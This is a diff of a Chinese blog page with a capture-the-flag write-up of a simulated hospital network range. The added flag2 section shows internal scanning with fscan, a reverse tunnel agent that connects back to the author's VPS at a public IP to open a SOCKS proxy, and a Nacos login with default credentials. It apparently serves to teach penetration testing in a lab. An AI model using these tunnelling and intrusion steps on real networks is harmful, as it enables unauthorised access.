@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 flag1 shiro反序列化RCE 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 flag1 1.shiro反序列化RCE 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
 <title>2025-Hospital</title>
 
 <link rel='canonical' href='https://luo-kaihong.github.io/p/2025-hospital/'>
 
-<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="2025-Hospital">
-<meta property='og:description' content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 flag1 shiro反序列化RCE 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025-Hospital">
+<meta property='og:description' content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 flag1 1.shiro反序列化RCE 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-hospital/'>
 <meta property='og:site_name' content='罗铠鸿'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-06-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-06-12T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2025-Hospital">
-<meta name="twitter:description" content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 flag1 shiro反序列化RCE 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
+<meta name="twitter:description" content=" 地址：仿真场景-专业徽章\n概述：\n1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 flag1 1.shiro反序列化RCE 先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -281,8 +281,13 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#shiro反序列化rce">shiro反序列化RCE</a></li>
-    <li><a href="#预期vimbasic提权升级交互式终端">预期：vim.basic提权：升级交互式终端</a></li>
+    <li><a href="#1shiro反序列化rce">1.shiro反序列化RCE</a></li>
+    <li><a href="#2预期vimbasic提权升级交互式终端">2.预期：vim.basic提权：升级交互式终端</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#1信息搜集与代理搭建">1.信息搜集与代理搭建</a></li>
+    <li><a href="#2nacos-yaml反序列化">2.nacos Yaml反序列化</a></li>
   </ol>
 </nav>
         </div>
@@ -380,7 +385,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h1 id="flag1">flag1
-</h1><h2 id="shiro反序列化rce">shiro反序列化RCE
+</h1><h2 id="1shiro反序列化rce">1.shiro反序列化RCE
 </h2><p>先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4</p>
 <p>扫描得到</p>
 <p><img src="/p/2025-hospital/image-20250612221343251.png"
@@ -453,7 +458,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><img src="image-20250617214419741.png" alt="image-20250617214419741" style="zoom:50%;" />
-<h2 id="预期vimbasic提权升级交互式终端">预期：vim.basic提权：升级交互式终端
+<h2 id="2预期vimbasic提权升级交互式终端">2.预期：vim.basic提权：升级交互式终端
 </h2><p>升级交互式终端，以欺骗某些命令让它们以为在合适的终端运行,vim.basic有suid权限，但是必须有tty，也就是交互式shell</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -500,7 +505,155 @@
     >春秋云境-Hospital</a>，<a class="link" href="https://lca.xlog.app/chun-qiu-yun-jing-fang-zhen-ba-chang-Hospital-shi-cao?locale=zh"  target="_blank" rel="noopener"
     >春秋云镜仿真靶场Hospital实操 - lca</a>这两篇，交互终端后添加一个拥有root的hacker账户，但是不知道为啥云服务器上编辑这个/etc/passwd有点问题（编辑云服务器的/etc/passwd可以，题目的不行），所以就直接提权拿flag了</p>
 <h1 id="flag2">flag2
-</h1>
+</h1><h2 id="1信息搜集与代理搭建">1.信息搜集与代理搭建
+</h2><img src="image-20250914200012254.png" alt="image-20250914200012254" style="zoom:50%;" />
+<p>然后上传linux版的fscan在tmp下，然后赋予权限就可以执行命令了</p>
+<p><img src="/p/2025-hospital/image-20250914195927561.png"
+	width="1372"
+	height="730"
+	srcset="/p/2025-hospital/image-20250914195927561_hu_7edff884df0fcd29.png 480w, /p/2025-hospital/image-20250914195927561_hu_b459247716e979c3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250914195927561"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="451px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod 777 fscan
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./fscan -h 172.30.12.5/24 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://github.com/shadow1ng/fscan/releases"  target="_blank" rel="noopener"
+    >https://github.com/shadow1ng/fscan/releases</a></p>
+<p><img src="/p/2025-hospital/image-20250914205456112.png"
+	width="1777"
+	height="647"
+	srcset="/p/2025-hospital/image-20250914205456112_hu_ce5e8461807818e6.png 480w, /p/2025-hospital/image-20250914205456112_hu_c74bda0da74eab42.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250914205456112"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="274"
+		data-flex-basis="659px"
+	
+></p>
+<p>发现资产</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://172.30.12.6:8848 poc-yaml-alibaba-nacos poc-yaml-alibaba-nacos-v1-auth-bypass 
+</span></span><span class="line"><span class="cl">http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意，下载fscan的1.8.4版本一下就行，最新版本扫不出来这个yaml（奇奇怪怪）</p>
+<p>然后搭建代理，把<code>linux_x64_agent</code>上传到当前目录(如/tmp目录)，然后执行<code>chmod 777 ./linux_x64_agent</code></p>
+<p><img src="/p/2025-hospital/image-20250914210039325.png"
+	width="913"
+	height="172"
+	srcset="/p/2025-hospital/image-20250914210039325_hu_d636f9d483ec4331.png 480w, /p/2025-hospital/image-20250914210039325_hu_e924a9a03082050.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250914210039325"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="530"
+		data-flex-basis="1273px"
+	
+></p>
+<p>把<code>linux_x64_admin</code>上传到自己的vps上，给执行权限后（<strong>chmod 777 ./linux_x64_admin</strong>）执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./linux_x64_admin -l 12345 -s 123456
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>注1：vps的端口为12345，连接密钥是123456，均可自定义</strong>，安全组记得打开</p>
+<p>然后再冰蝎执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./linux_x64_agent -c 101.200.39.193:12345 -s 123456 --reconnect 8
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250914210456091.png" alt="image-20250914210456091" style="zoom:50%;" />
+<p><img src="/p/2025-hospital/image-20250914210517121.png"
+	width="602"
+	height="90"
+	srcset="/p/2025-hospital/image-20250914210517121_hu_c6de3bf9f35ef193.png 480w, /p/2025-hospital/image-20250914210517121_hu_c2c9cad56fc2ee00.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250914210517121"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="668"
+		data-flex-basis="1605px"
+	
+></p>
+<p>成功搭建隧道，然后在vps上依次执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use 0
+</span></span><span class="line"><span class="cl">socks 5555  //端口可自定义，记得安全组打开
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250914210618217.png" alt="image-20250914210618217" style="zoom:50%;" />
+<p>然后FoxyProxy插件设置代理，如下：</p>
+<p><img src="/p/2025-hospital/image-20250914210725753.png"
+	width="1515"
+	height="463"
+	srcset="/p/2025-hospital/image-20250914210725753_hu_31f21fc214e3565b.png 480w, /p/2025-hospital/image-20250914210725753_hu_ad48ec0836301101.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250914210725753"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="327"
+		data-flex-basis="785px"
+	
+></p>
+<h2 id="2nacos-yaml反序列化">2.nacos Yaml反序列化
+</h2><p>访问 nacos 应用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://172.30.12.6:8848/nacos/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>弱口令进入后台<code>nacos:nacos</code></p>
+
 </section>
 
 
@@ -555,12 +708,12 @@
             
                 
 <article class="">
-    <a href="/p/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+    <a href="/p/2025-%E6%98%A5%E7%A7%8B%E9%95%BF%E5%9F%8E%E6%9D%AF/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2023-极客大挑战</h2>
+            <h2 class="article-title">2025-春秋长城杯</h2>
         </div>
     </a>
 </article>
@@ -568,12 +721,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-8.8%E6%97%A5awd/">
+    <a href="/p/2025n1ctf/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-8.8日AWD</h2>
+            <h2 class="article-title">2025N1CTF</h2>
         </div>
     </a>
 </article>
@@ -581,12 +734,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9Fctf/">
+    <a href="/p/2025-%E6%B9%BE%E5%8C%BA%E6%9D%AF/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-第十届上海大学生ctf</h2>
+            <h2 class="article-title">2025-湾区杯</h2>
         </div>
     </a>
 </article>
@@ -594,12 +747,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-swpu-nssctf/">
+    <a href="/p/2025-9.6awd/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-swpu-nssctf</h2>
+            <h2 class="article-title">2025-9.6awd</h2>
         </div>
     </a>
 </article>
